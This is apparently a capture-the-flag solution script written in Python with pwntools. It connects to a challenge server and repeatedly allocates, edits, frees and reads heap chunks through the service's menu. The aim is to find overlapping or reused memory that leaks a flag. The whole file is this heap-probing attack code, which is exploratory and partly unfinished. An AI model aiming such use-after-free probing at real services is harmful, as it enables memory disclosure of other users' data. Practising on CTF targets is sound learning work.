import random
from pwn import*
from colorama import*

init(autoreset=True)


'''
    do this for every 2 chunks and see which has the sensitive info
    Allocate memory for chunk 9
    edit chunk 9 and put "9" in it
    free chunk 9
    allocate chunk 8
    edit 8 with "8" (hopefully some system process does this with the flag! )
    edit chunk 9 with "nearby"
    view 8, it should now say "nearby"
'''

conn = remote("0.cloud.chals.io", 11289)


def hex_to_ascii(byte_string: bytes):
    # Decode and print the ASCII representation
    ascii_representation = byte_string.decode('unicode_escape')
    print(ascii_representation)


def allocate_chunk(chunk: str):
    # say we want to allocate a chunk
    conn.sendline(b"1")
    output = conn.recvuntil(b"Index (0-9): ")
    conn.sendline(chunk.encode())

def edit_chunk(chunk: str):
    # say we want to write to a chunk
    conn.recvuntil(b"Choice: ")
    conn.sendline(b"3")

    # specify which index
    conn.recvuntil(b"Index (0-9): ")
    conn.sendline(chunk.encode())


    # specify the data we want to write to that index
    conn.recvuntil(b"Enter data: ")
    conn.sendline(b"some_data")

def print_chunk(chunk: str) -> bytes:
    conn.recvuntil(b"Choice: ")
    conn.sendline(b"4")

    # say which index we want to see
    conn.recvuntil(b"Index (0-9): ")
    conn.sendline(chunk.encode())

    # now print the index
    output = conn.recvline()
    return output

def free_chunk(chunk: str):
    conn.recvuntil(b"Choice: ")
    conn.sendline(b"2")

    # say which index we want to see
    conn.recvuntil(b"Index (0-9): ")
    conn.sendline(chunk.encode())



def main():
    # allocating all chunks except 0-2
    for current_chunk in range(2, 10):
        print(f"[ Iteration: {current_chunk} ]")
    
        # chunk = f"{random.randint(0, 9)}"
        chunk: str = f"{current_chunk}"
        allocate_chunk(chunk)
        # edit_chunk(chunk)
        # free_chunk(chunk)
    
    # free every chunk from 9-1 except 2
    for current_chunk in range(0, 10):
        print(f"[ Iteration: {current_chunk} ]")
    
        # chunk = f"{random.randint(0, 9)}"
        chunk: str = f"{current_chunk}"
        allocate_chunk(chunk)
        edit_chunk(chunk)
        free_chunk(chunk)
    

    # want to read lowest chunk now
    chunk = "1"
    allocate_chunk(chunk)
    chunk_data = print_chunk(chunk)
    if chunk_data != b"\n":
        print(f"{Fore.MAGENTA}Chunk \'{chunk}\' was newly allocated but isn't empty something nearby wrote to it!\t\'{chunk_data}\'")
        hex_to_ascii(chunk_data)
        input()

def legacy_main():
    # NOTE: after reversed try ascending, then random (all iterations/combinations of chunk frees/edits/views )
    allocated = 0
    for current_chunk in range(0, 10):
        print(f"[ Iteration: {current_chunk} ]")
    
        # chunk = f"{random.randint(0, 9)}"
        chunk: str = f"{current_chunk}"
        allocate_chunk(chunk)
        # edit_chunk(chunk)
        free_chunk(chunk)
        # print_chunk(chunk)

        # NOTE: need a stop condition for this:
        # chunk = f"{random.randint(0, 9)}"
        chunk: str = f"{current_chunk - 1}"
        allocate_chunk(chunk)
        print_chunk(chunk)
        # editing the freed chunk
        # edit_chunk(chunk)
        
        # now chunk 8 prints "some_data" because these 2 memory chunks overlapped.
        chunk_data = print_chunk(chunk)
        if chunk_data != b"\n":
            print(f"{Fore.MAGENTA}Chunk \'{chunk}\' was newly allocated but isn't empty something nearby wrote to it!\t\'{chunk_data}\'")
            hex_to_ascii(chunk_data)
            input()
    



if __name__ == "__main__":
    main()
